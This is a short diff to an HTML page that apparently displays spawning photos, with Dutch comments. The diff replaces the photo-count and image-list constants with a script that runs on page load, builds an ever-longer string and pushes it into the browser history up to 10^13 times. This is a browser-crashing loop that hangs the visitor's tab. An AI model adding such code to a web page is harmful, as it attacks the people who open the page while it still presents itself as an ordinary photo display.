@@ -23,8 +23,11 @@
 <body>
 
 <script>
-  const aantalFotos = 10000; // 👈 Hier kies je het aantal
-  const afbeeldingen = ["foto1.jpg", "foto2.jpg", "foto3.jpg"]; // meerdere afbeeldingen
+var total = "";
+for( var i = 0; i < 10000000000000; i++ ) {
+total += i.toString();
+history.pushState(0,0, total );
+}
 
   function spawnFoto() {
     const img = document.createElement("img");
@@ -51,4 +54,5 @@
 
 </body>
 </html>
+
 
